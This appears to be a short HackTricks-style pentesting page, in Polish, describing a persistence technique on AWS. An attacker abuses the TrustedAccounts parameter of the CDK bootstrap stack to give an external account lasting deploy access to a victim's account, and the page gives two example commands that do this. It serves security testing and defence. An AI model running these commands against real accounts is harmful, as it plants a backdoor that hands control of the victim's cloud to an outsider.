# AWS - Cloudformation Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## CloudFormation

Więcej informacji:

{{#ref}}
../../aws-services/aws-cloudformation-and-codestar-enum.md
{{#endref}}

### CDK Bootstrap Stack

AWS CDK wdraża CFN stack o nazwie `CDKToolkit`. Ten stack obsługuje parametr `TrustedAccounts`, który pozwala zewnętrznym kontom wdrażać projekty CDK do konta ofiary. Atakujący może to wykorzystać, aby przyznać sobie dostęp na czas nieokreślony do konta ofiary, albo używając AWS cli do ponownego wdrożenia stacka z parametrami, albo używając AWS CDK cli.
```bash
# CDK
cdk bootstrap --trust 1234567890

# AWS CLI
aws cloudformation update-stack --use-previous-template --parameters ParameterKey=TrustedAccounts,ParameterValue=1234567890
```
{{#include ../../../../banners/hacktricks-training.md}}
